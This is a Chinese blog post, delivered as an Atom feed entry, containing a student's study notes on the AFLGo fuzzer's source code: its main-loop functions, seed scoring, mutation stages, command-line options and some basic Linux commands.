    <category term="AFLGo" scheme="https://laobameishijia.github.io/tag/AFLGo/"/>
    
  </entry>
  
  <entry>
    <title>毕设-Fuzz-AFLGo源码阅读-5</title>
    <link href="https://laobameishijia.github.io/2022/02/21/bi-she-fuzz-aflgo-yuan-ma-yue-du-5/"/>
    <id>https://laobameishijia.github.io/2022/02/21/bi-she-fuzz-aflgo-yuan-ma-yue-du-5/</id>
    <published>2022-02-21T09:25:00.000Z</published>
    <updated>2022-08-04T10:38:04.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AFLGo源码阅读"><a href="#AFLGo源码阅读" class="headerlink" title="AFLGo源码阅读"></a>AFLGo源码阅读</h1><ul><li><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">AFLGo源码阅读</a><ul><li><a href="#%E6%8C%89%E7%85%A7main%E5%87%BD%E6%95%B0%E4%B8%AD%E7%9A%84%E9%A1%BA%E5%BA%8F">按照Main函数中的顺序</a><ul><li><a href="#setup_signal_handlers">setup_signal_handlers</a></li><li><a href="#check_asan_opts">check_asan_opts()</a></li><li><a href="#fix_up_sync--%E4%B8%8D%E7%9F%A5%E9%81%93%E5%85%B7%E4%BD%93%E7%94%A8%E9%80%94">fix_up_sync()–不知道具体用途</a></li><li><a href="#save_cmdlineargc-argv">save_cmdline(argc, argv)</a></li><li><a href="#fix_up_bannerargvoptind">fix_up_banner(argv[optind])</a></li><li><a href="#check_if_tty">check_if_tty()</a></li><li><a href="#get_core_count">get_core_count()</a></li><li><a href="#bind_to_free_cpu">bind_to_free_cpu()</a></li><li><a href="#check_crash_handling">check_crash_handling()</a></li><li><a href="#check_cpu_governor">check_cpu_governor()</a></li><li><a href="#setup_post">setup_post()</a></li><li><a href="#setup_shm">setup_shm()</a></li><li><a href="#init_count_class16">init_count_class16()</a></li><li><a href="#setup_dirs_fds">setup_dirs_fds()</a></li><li><a href="#read_testcases">read_testcases()</a></li><li><a href="#load_auto">load_auto()</a></li><li><a href="#pivot_inputs">pivot_inputs()</a><ul><li><a href="#c%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86">C语言知识</a></li></ul></li><li><a href="#load_extras">load_extras()</a></li><li><a href="#find_timeout">find_timeout()</a></li><li><a href="#detect_file_args">detect_file_args()</a><ul><li><a href="#c%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86-1">C语言知识</a></li></ul></li><li><a href="#setup_stdio_file">setup_stdio_file()</a></li><li><a href="#check_binary">check_binary()</a></li><li><a href="#get_qemu_argv">get_qemu_argv()</a></li><li><a href="#perform_dry_run">perform_dry_run()</a><ul><li><a href="#calibrate_case">calibrate_case()</a><ul><li><a href="#count_bytes">count_bytes()</a></li><li><a href="#update_bitmap_score">update_bitmap_score()</a></li><li><a href="#minimize_bits">minimize_bits()</a></li></ul></li></ul></li><li><a href="#cull_queue">cull_queue()</a><ul><li><a href="#mark_as_redundant">mark_as_redundant</a></li></ul></li><li><a href="#show_init_stats">show_init_stats()</a></li><li><a href="#find_start_position">find_start_position()</a></li><li><a href="#write_stats_file">write_stats_file()</a></li><li><a href="#save_auto">save_auto()</a></li><li><a href="#fuzz_one--while%E5%BE%AA%E7%8E%AF">fuzz_one &amp;&amp; while循环</a><ul><li><a href="#calculate_score">calculate_score()</a></li><li><a href="#common_fuzz_stuff">common_fuzz_stuff()</a></li><li><a href="#run_target">run_target()</a><ul><li><a href="#c-%E7%9F%A5%E8%AF%86">C 知识</a><ul><li><a href="#%E8%BF%9B%E7%A8%8B%E7%8A%B6%E6%80%81">进程状态</a></li><li><a href="#setitimer">setitimer</a></li></ul></li></ul></li><li><a href="#save_if_interesting">save_if_interesting</a></li></ul></li><li><a href="#write_bitmap">write_bitmap()</a></li><li><a href="#write_stats_file-1">write_stats_file()</a></li><li><a href="#stop_fuzzing">stop_fuzzing:</a></li></ul></li><li><a href="#aflgo%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0">AFLgo命令行启动参数</a></li><li><a href="#linux%E5%91%BD%E4%BB%A4">Linux命令</a></li><li><a href="#%E5%8F%82%E8%80%83">参考</a></li></ul></li></ul><h2 id="按照Main函数中的顺序"><a href="#按照Main函数中的顺序" class="headerlink" title="按照Main函数中的顺序"></a>按照Main函数中的顺序</h2><h3 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>初始化各种信号量</p><p>终止进程的、超时的等等</p><h3 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts()"></a>check_asan_opts()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>通过检查环境变量中的值来判断–检查ASAN设置</p><h3 id="fix-up-sync-–不知道具体用途"><a href="#fix-up-sync-–不知道具体用途" class="headerlink" title="fix_up_sync()–不知道具体用途"></a>fix_up_sync()–不知道具体用途</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>没理解</p><h3 id="save-cmdline-argc-argv"><a href="#save-cmdline-argc-argv" class="headerlink" title="save_cmdline(argc, argv)"></a>save_cmdline(argc, argv)</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>用<code>orig_cmdline</code>保存复制当前命令行</p><h3 id="fix-up-banner-argv-optind"><a href="#fix-up-banner-argv-optind" class="headerlink" title="fix_up_banner(argv[optind])"></a>fix_up_banner(argv[optind])</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>根据最后一个参数设置标头(banner)?</p><h3 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty()"></a>check_if_tty()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>检查是不是在终端运行</p><h3 id="get-core-count"><a href="#get-core-count" class="headerlink" title="get_core_count()"></a>get_core_count()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>从系统文件中获取cpu核的相关信息</p><h3 id="bind-to-free-cpu"><a href="#bind-to-free-cpu" class="headerlink" title="bind_to_free_cpu()"></a>bind_to_free_cpu()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>把进程绑定在具体的内核上？</p><h3 id="check-crash-handling"><a href="#check-crash-handling" class="headerlink" title="check_crash_handling()"></a>check_crash_handling()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>保证core dumps不会进入程序, 否则会增加将崩溃信息通过waitpid传递给fuzzer的延迟。</p><h3 id="check-cpu-governor"><a href="#check-cpu-governor" class="headerlink" title="check_cpu_governor()"></a>check_cpu_governor()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>要把CPU频率调节的算法(可能忽视fuzz产生的短进程)关了，以提高aflgo-fuzz的效率。</p><h3 id="setup-post"><a href="#setup-post" class="headerlink" title="setup_post()"></a>setup_post()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>不理解</p><h3 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm()"></a>setup_shm()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>配置共享内存和<code>virgin_bits</code>, 并且将共享内存的首地址赋值给<code>trace_bits</code>.</p><h3 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16()"></a>init_count_class16()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>之所以用左移是为了加快速度</p><p>最终初始化是下面这个样子。16位一个<br>        0-0 ….      128-0  -256个元素   :0-1-2-4-8-16-32-64-128<br>      ⬇ 0-1 ….<br>        0-2 ….<br>        0-2 ….<br>        0-4 ….<br>        0-4 ….<br>        ………….<br>        0-128….    128-128         一共 65536个 16bit</p><h3 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds()"></a>setup_dirs_fds()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><ol><li><p>flock 了 out_dir_fd</p></li><li><p>创建了跟下面有关的目录</p><ul><li>queue </li><li>crashes</li><li>hangs<br>…. </li></ul></li><li><p>还创建其他的fd(/dev/null&amp;/dev/urandom)方便后续使用</p></li></ol><h3 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases()"></a>read_testcases()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>从<code>input directory</code>中读取所有的测试用例，检测测试用例的大小，以及是否已经完成了<code>deterministic fuzzing</code>阶段，然后添加到queue中。</p><p>初始化</p><ul><li>queued_at_start  Total number of initial inputs</li><li>last_path_time   Time for most recent path (ms)</li></ul><h3 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto()"></a>load_auto()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>加载自动生成的附加组件</p><h3 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs()"></a>pivot_inputs()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><ul><li>首先检查是不是之前跑过的<ul><li>如果是的话，看一下id是不是一致。<ul><li>id一致, 要改变对应entry的depth</li></ul></li><li>如果不是，就起新名字 <code>id:%06u,orig:%s</code></li><li>然后就是重新命名文件，并且更改<code>q-&gt;fname=nfn</code></li></ul></li></ul><h4 id="C语言知识"><a href="#C语言知识" class="headerlink" title="C语言知识"></a>C语言知识</h4><p>strrchr和strchr类似，但是从右向左找字符c，找到字符c第一次出现的位置就返回，函数名中间多了一个字母r可以理解为Right-to-left。</p><h3 id="load-extras"><a href="#load-extras" class="headerlink" title="load_extras()"></a>load_extras()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>这个没看懂是干啥的。<br>跟这些有关，但是不知道具体在fuzz的过程中起到了什么作用</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">struct extra_data &#123;  u8* data;                           &#x2F;* Dictionary token data            *&#x2F;  u32 len;                            &#x2F;* Dictionary token length          *&#x2F;  u32 hit_cnt;                        &#x2F;* Use count in the corpus          *&#x2F;&#125;;static struct extra_data* extras;     &#x2F;* Extra tokens to fuzz with        *&#x2F;static u32 extras_cnt;                &#x2F;* Total number of tokens read      *&#x2F;static struct extra_data* a_extras;   &#x2F;* Automatically selected extras    *&#x2F;static u32 a_extras_cnt;              &#x2F;* Total number of tokens available *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout()"></a>find_timeout()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>只有在Resuming an older fuzzing job的情况下，才会使用。</p><p>从状态目录中读取文件名, 并把<code>exec_timeout :</code>后面的值复制给<code>exec_tmout</code>, 将timeout_given赋值为3.</p><h3 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args()"></a>detect_file_args()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>根据参数@@后面带的东西，更改文件名. 看的也不是很懂。</p><h4 id="C语言知识-1"><a href="#C语言知识-1" class="headerlink" title="C语言知识"></a>C语言知识</h4><p>定义函数：char * getcwd(char * buf, size_t size);</p><p>函数说明：getcwd()会将当前的工作目录绝对路径复制到参数buf 所指的内存空间，参数size 为buf 的空间大小。</p><p>注：<br>1、在调用此函数时，buf 所指的内存空间要足够大。若工作目录绝对路径的字符串长度超过参数size 大小，则返回NULL，errno 的值则为ERANGE。<br>2、倘若参数buf 为NULL，getcwd()会依参数size 的大小自动配置内存(使用malloc())，如果参数size 也为0，则getcwd()会依工作目录绝对路径的字符串程度来决定所配置的内存大小，进程可以在使用完次字符串后利用free()来释放此空间。</p><h3 id="setup-stdio-file"><a href="#setup-stdio-file" class="headerlink" title="setup_stdio_file()"></a>setup_stdio_file()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>如果没有用-f指定输出文件的话, 那就用默认的<code>.cur_input</code>创建</p><h3 id="check-binary"><a href="#check-binary" class="headerlink" title="check_binary()"></a>check_binary()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>具体代码没看。。</p><p>检查目标二进制文件是否存在，以及它是否是shell脚本。确保可以进行afl的插桩。</p><h3 id="get-qemu-argv"><a href="#get-qemu-argv" class="headerlink" title="get_qemu_argv()"></a>get_qemu_argv()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>不知道干啥的</p><h3 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run()"></a>perform_dry_run()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>简单的把所有的测试用例都提前运行一遍，确保程序像预期的那样运行。如果不是的话，会有一些相应的提示。</p><h4 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case()"></a>calibrate_case()</h4><p>测试一个entry，看看是不是有覆盖率、新的路径的添加等等变量是否正常工作啥的。 </p><p>这里会运行<code>run_target</code>来计算<code>distance</code>, 这是对已经加入队列的entry而言的。</p><p>关于<code>entry</code>属性里面的<code>var_behavior</code>的理解: 因为在<code>calibrate</code>的阶段中，是没有发生变异的，那么如果测试用例在经过不同次数的执行后，产生了不一样的<code>path</code>。那么就把这个<code>entry</code>标记为<code>variable</code>。<strong>这个属性并没有影响到后续的其他步骤</strong>。根据注释，应该只是简单的标注，方便能找到吧。</p><h5 id="count-bytes"><a href="#count-bytes" class="headerlink" title="count_bytes()"></a>count_bytes()</h5><p>数一下有多少个字节不为零, 8位代表一个path, 不同的命中次数可能会导致8位中不同位置的bit置1</p><h5 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score()"></a>update_bitmap_score()</h5><p>当某个entry触发了新的path, 我们要与之前的同样触发这个path的”最优”的entry进行一个比较。看看到底谁更优秀。</p><p>所谓的<code>top_rated[]</code> 就是 <code>a minimal set of paths that trigger all the bits seen in the bitmap so far.</code></p><h5 id="minimize-bits"><a href="#minimize-bits" class="headerlink" title="minimize_bits()"></a>minimize_bits()</h5><p>把<code>trace_bits</code>压缩为一个占用空间更小的数组。1位代表一个<code>path</code>现在。所以刚好是分配了<code>MAP_SIZE&gt;&gt;3</code>的空间。</p><h3 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue()"></a>cull_queue()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p><code>top_rated[i]</code> 代表的就是发现路径序号为i的最优entry(fav_factor最小的) 而且<strong>关键的是top_rated[i] 指针指向的是queue中的特定的entry</strong>。所以在将<code>top_rated[i]-&gt;favored = 1 </code>时，原来<code>queue</code>中的<code>entry</code>的<code>favored</code>也同样被设置为1</p><p>值得注意的是，并不是说<code>top_rated[]</code>中所有的<code>entry</code>都是<code>favored</code>的。当且仅当你发现的<code>path</code>是你之前<code>entry</code>都没有发现过的情况下，这个<code>entry</code>才会被设置为<code>favored</code></p><blockquote><p>我觉得这里有个值得深思的地方，程序这样设计的话，test_case的顺序会影响到其是否会被设置为favored. 这种随机性会不会对框架整体的性能产生一定的影响。</p></blockquote><h4 id="mark-as-redundant"><a href="#mark-as-redundant" class="headerlink" title="mark_as_redundant"></a>mark_as_redundant</h4><p>把对应的<code>entry</code>标记为<code>redundant</code>，其间还会创建一些目录，至于什么作用没看懂。</p><h3 id="show-init-stats"><a href="#show-init-stats" class="headerlink" title="show_init_stats()"></a>show_init_stats()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>显示统计数据 Total calibration cycles\max_bits\min_bits\exec_us\len等等</p><p>根据平均运行时间重新设置一个<code>timeout_given</code></p><h3 id="find-start-position"><a href="#find-start-position" class="headerlink" title="find_start_position()"></a>find_start_position()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>当要恢复程序进程的时候，从<code>fuzzer_stats</code>目录的文件的文件名中读取相应的位置。</p><h3 id="write-stats-file"><a href="#write-stats-file" class="headerlink" title="write_stats_file()"></a>write_stats_file()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>把用到的基本状态信息都写入到状态文件中，这些变量都会在终端页面显示中用到。</p><h3 id="save-auto"><a href="#save-auto" class="headerlink" title="save_auto()"></a>save_auto()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>自动保存生成的extras，这个跟token有关系，但没看懂token到底有什么作用。</p><h3 id="fuzz-one-amp-amp-while循环"><a href="#fuzz-one-amp-amp-while循环" class="headerlink" title="fuzz_one &amp;&amp; while循环"></a>fuzz_one &amp;&amp; while循环</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>接下来是循环中的函数</p><ul><li><p>首先在进入循环之前, 要先cull_queue, 把favor的entry标记出来</p></li><li><p>判断queue_cur是否为空</p><ul><li>如果为空的话，说明是第一次进入循环。进行必要的初始化。</li></ul></li><li><p>然后就是fuzz_one</p><ul><li>判断在当下的队列中，是否含有 <code>favored\non-fuzzed</code> 的<code>entry</code>，如果有那么会<strong>以99%的概率跳过那些已经被fuzz过或者不是favored</strong>的<code>entry</code>.</li><li>如果没有上面所说的那种类型的<code>entry</code> 会以75%跳过not fuzzed ，以95%跳过fuzzed的<code>entry</code>。 </li><li>然后将test case中的内容映射到内存中，这样文件中的位置直接就有对应的内存地址，对文件的读写可以直接用指针来做而不需要<code>read</code>\<code>write</code>函数。</li><li>如果最初的calibration阶段失败了, 那现在要重新来一遍。</li><li><code>trimming</code>阶段，<strong>这个阶段的作用，没看懂</strong>。 不明白为什么这个函数会调用run_taget</li><li>计算entry分数</li><li>看看是否要跳过<code>deterministic</code>变异阶段<ul><li>如果skip_deterministic设置为1、或者entry fuzzed或者entry-&gt;passed_det设置为1)</li><li>如果执行路径校验将其置于该主实例的范围之外，则跳过确定性模糊处理。</li></ul></li><li>按照以下阶段进行变异 <ul><li>simple bitflip</li><li>arithmetic</li><li>interst</li><li>dictionary</li><li>havoc</li><li>splice<blockquote><p>当然在这些变异阶段中, 大多都是每变异一次就进行<code>common_fuzz_stuff</code>。 还有很多为了保证程序效率(比如: 当变异出现的结果在之前的变异阶段已经被运行过的时候可以跳过、当对于某个字节的变异没有出现效果，那在以后的变异阶段就不会变异该字节了-相当于认为该字节对于提高程序效果没有太大的意义)<br>还有<code>common_fuzz_stuff</code>阶段产生出来的<em>新的变异enrty</em>会根据<code>save_if_interetring</code>函数来决定是否加入到队列中。加入队列的方式是<strong>尾插法！</strong>只不过把刚刚添加进队列的<code>entry</code>看作是<code>queue_top</code></p></blockquote></li></ul></li></ul><p>循环结束后，回对sync_fuzzer进行一个操作，这个可以后面再看。</p></li></ul><h4 id="calculate-score"><a href="#calculate-score" class="headerlink" title="calculate_score()"></a>calculate_score()</h4><p>计算得分,跟得分有关的因素</p><ul><li><code>exec_us</code> 和<code>avg_execc_us</code>的大小关系, <code>exec_us</code>相对越小, 得分肯定就越高</li><li><code>bitmap_size</code>(发现的路径数) 和 <code>avg_bitmap_size</code>大小关系, <code>bitmap_size</code>相对越高, 得分越高</li><li><code>handicap</code> 某个<code>testcase</code>可能是在程序运行的末尾才发现, 然后被添加到队列中。而这个时候，队列中前面的<code>entry</code>很有可能已经运行了很多<code>cycle</code>. 所以，这部分<strong>后来添加到队列中</strong>的<code>entry</code>得分更高。</li><li><code>depth</code> 原文 <em>under the assumption that fuzzing deeper test cases is more likely to reveal stuff that can’t be discovered with traditional fuzzers.</em> <code>depth</code>的值越大，得分也就越高。也就是说, 一些变异的<code>entry</code>较大可能会是后面才添加进来的。所以假设越往后添加进来的越高。<strong>这个要跟上面的handicap相区别，depth反映的是队列中的entry数量, handicap是整体队列变异的cycle</strong></li><li><code>cooling_schedule</code> 基于距离的模拟退火算法, 距离越近的随着时间的推移, <code>power_factor</code>会越来越高. 相对应的得分也就越高. <code>perf_score *= power_factor</code> </li></ul><blockquote><p>具体的得分，跟确定性变异阶段的时间没有关系，得分越高，随机性变异阶段的时间也就越长。</p></blockquote><h4 id="common-fuzz-stuff"><a href="#common-fuzz-stuff" class="headerlink" title="common_fuzz_stuff()"></a>common_fuzz_stuff()</h4><p>把经过变异修改的文件重新写入testcase, 然后在进行<code>run_target()</code>。接着运行<code>save_if_interesting()</code>判断是否对变异的testcase进行统计或者其他操作</p><h4 id="run-target"><a href="#run-target" class="headerlink" title="run_target()"></a>run_target()</h4><ul><li>第一种情况: 独自运行exec, 等待子进程结束</li><li>第二种情况: 通过管道和forkserver通信，forkserver fork出一个子进程进行fuzz，将子进程的状态写入通道。 父进程再通过通道中的信息, 对程序状态进行返回。<strong>当然在子进程进行fuzz的过程中 trace_bits会发生更新</strong></li></ul><h5 id="C-知识"><a href="#C-知识" class="headerlink" title="C 知识"></a>C 知识</h5><h6 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h6><ul><li>WIFSIGNALED(status)为非0 表明进程异常终止 <strong>用来判断crash</strong></li><li>WIFSTOPPED(status)为非0 表明进程处于暂停状态 <strong>用来判断fork server是否正常进行, 此时因为fork server是处于循环当中，所以对应的状态是处于暂停。</strong></li><li>WTERMSIG(status) 获取程序退出的信号(比如:<code>SIGKILL</code>)</li></ul><h6 id="setitimer"><a href="#setitimer" class="headerlink" title="setitimer"></a>setitimer</h6><p>关于这个，详细的内容网上都有。 但是没搞清楚这个时间定时到底是阻塞的还是非阻塞的。？？</p><h4 id="save-if-interesting"><a href="#save-if-interesting" class="headerlink" title="save_if_interesting"></a>save_if_interesting</h4><p>看一下当前的testcase是否触发了新的路径, 如果触发了新的路径，需要把这个testcase添加到当前的队列里面。并且要在queue中以<code>(&quot;%s/queue/id:%06u,%llu,%s&quot;, out_dir, queued_paths, get_cur_time() - start_time ,describe_op(hnb))</code>这样的形式命名。</p><p>根据<code>run_target()</code>的返回值，处理timeout、crash、error的情况</p><h3 id="write-bitmap"><a href="#write-bitmap" class="headerlink" title="write_bitmap()"></a>write_bitmap()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>把当前共享内存中的bitmap写到文件中去</p><h3 id="write-stats-file-1"><a href="#write-stats-file-1" class="headerlink" title="write_stats_file()"></a>write_stats_file()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>更新状态文件中的数据</p><h3 id="stop-fuzzing"><a href="#stop-fuzzing" class="headerlink" title="stop_fuzzing:"></a>stop_fuzzing:</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>程序的终止是需要用户自己按下<code>ctrl+c</code> 循环不会自己退出</p><p>对占有的内存空间进行释放, 退出程序</p><h2 id="AFLgo命令行启动参数"><a href="#AFLgo命令行启动参数" class="headerlink" title="AFLgo命令行启动参数"></a>AFLgo命令行启动参数</h2><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>i</td><td>输入目录</td></tr><tr><td>o</td><td>输出目录</td></tr><tr><td>M</td><td>master sync ID</td></tr><tr><td>S</td><td>master sync ID</td></tr><tr><td>f</td><td>目标文件</td></tr><tr><td>x</td><td>字典目录</td></tr><tr><td>t</td><td>超时时间设定</td></tr><tr><td>m</td><td>内存限制</td></tr><tr><td>d</td><td>是否跳过确定性变异阶段</td></tr><tr><td>B</td><td>加载bitmap</td></tr><tr><td>C</td><td>Crash模式</td></tr><tr><td>T</td><td>banner</td></tr><tr><td>Q</td><td>QEMU模式</td></tr><tr><td>z</td><td>模拟退火算法选定</td></tr><tr><td>c</td><td>退火算法的运行时间</td></tr></tbody></table><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Required parameters:  -i <span class="token function">dir</span>        - input directory with <span class="token builtin class-name">test</span> cases  -o <span class="token function">dir</span>        - output directory <span class="token keyword">for</span> fuzzer findingsDirected fuzzing specific settings:  -z schedule   - temperature-based power schedules                  <span class="token punctuation">&#123;</span>exp, log, lin, quad<span class="token punctuation">&#125;</span> <span class="token punctuation">(</span>Default: exp<span class="token punctuation">)</span>  -c min        - <span class="token function">time</span> from start when SA enters exploitation                  <span class="token keyword">in</span> secs <span class="token punctuation">(</span>s<span class="token punctuation">)</span>, mins <span class="token punctuation">(</span>m<span class="token punctuation">)</span>, hrs <span class="token punctuation">(</span>h<span class="token punctuation">)</span>, or days <span class="token punctuation">(</span>d<span class="token punctuation">)</span>Execution control settings:  -f <span class="token function">file</span>       - location <span class="token builtin class-name">read</span> by the fuzzed program <span class="token punctuation">(</span>stdin<span class="token punctuation">)</span>  -t msec       - <span class="token function">timeout</span> <span class="token keyword">for</span> each run <span class="token punctuation">(</span>auto-scaled, <span class="token number">50</span>-1000 ms<span class="token punctuation">)</span>  -m megs       - memory limit <span class="token keyword">for</span> child process <span class="token punctuation">(</span><span class="token number">50</span> MB<span class="token punctuation">)</span>  -Q            - use binary-only instrumentation <span class="token punctuation">(</span>QEMU mode<span class="token punctuation">)</span>Fuzzing behavior settings:  -d            - quick <span class="token operator">&amp;</span> dirty mode <span class="token punctuation">(</span>skips deterministic steps<span class="token punctuation">)</span>  -n            - fuzz without instrumentation <span class="token punctuation">(</span>dumb mode<span class="token punctuation">)</span>  -x <span class="token function">dir</span>        - optional fuzzer dictionary <span class="token punctuation">(</span>see README<span class="token punctuation">)</span>Other stuff:  -T text       - text banner to show on the <span class="token function">screen</span>  -M / -S <span class="token function">id</span>    - distributed mode <span class="token punctuation">(</span>see parallel_fuzzing.txt<span class="token punctuation">)</span>  -C            - crash exploration mode <span class="token punctuation">(</span>the peruvian rabbit thing<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h2><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><ul><li><p><strong>export</strong></p><p>为shell变量或函数设置导出属性。它们会成为环境变量, 可以在脚本中访问它们，尤其是脚本中调用的子进程需要时。</p></li><li><p><strong>echo</strong></p><p>echo命令 用于在shell中打印shell变量的值，或者直接输出指定的字符串。linux的echo命令，在shell编程中极为常用, 在终端下打印变量value的时候也是常常用到的，因此有必要了解下echo的用法echo命令的功能是在显示器上显示一段文字，一般起到一个提示的作用。</p></li><li><p><strong>mkdir</strong></p><p>创建目录</p></li><li><p><strong>cat</strong></p><p>连接多个文件并打印到标准输出</p></li><li><p><strong>cut</strong></p><p>cut命令用来显示行中的指定部分，删除文件中指定字段。说明：该命令有两项功能，其一是用来显示文件的内容，它依次读取由参数 file 所指 明的文件，将它们的内容输出到标准输出上；其二是连接两个或多个文件，如cut fl f2 &gt; f3将把文件 fl 和 f2 的内容合并起来，然后通过输出重定向符“&gt;”的作用，将它们放入文件 f3 中。</p></li><li><p><strong>rev</strong></p><p>将文件内容以字符为单位反序输出—也就是每行的字符都到过来</p></li><li><p><strong>cp</strong></p><p>将源文件或目录复制到目标文件或目录中</p></li><li><p><strong>pushd&amp;&amp;popd</strong></p><p>倒可以简单地把这个命令理解为切换/再换回来目录的命令。</p></li><li><p><strong>chmod</strong></p><p>用来变更文件或目录的权限</p></li><li><p><strong>mv</strong></p><p>mv命令 用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。source表示源文件或目录，target表示目标文件或目录。如果将一个文件移到一个已经存在的目标文件中，则目标文件的内容将被覆盖</p></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><ol><li><a href="http://rk700.github.io/2018/01/04/afl-mutations/">http://rk700.github.io/2018/01/04/afl-mutations/</a></li><li><a href="https://rk700.github.io/2017/12/28/afl-internals/#%E5%88%86%E6%94%AF%E4%BF%A1%E6%81%AF%E7%9A%84%E5%88%86%E6%9E%90">https://rk700.github.io/2017/12/28/afl-internals/#%E5%88%86%E6%94%AF%E4%BF%A1%E6%81%AF%E7%9A%84%E5%88%86%E6%9E%90</a></li><li><a href="https://paper.seebug.org/496/#_2">https://paper.seebug.org/496/#_2</a></li><li><a 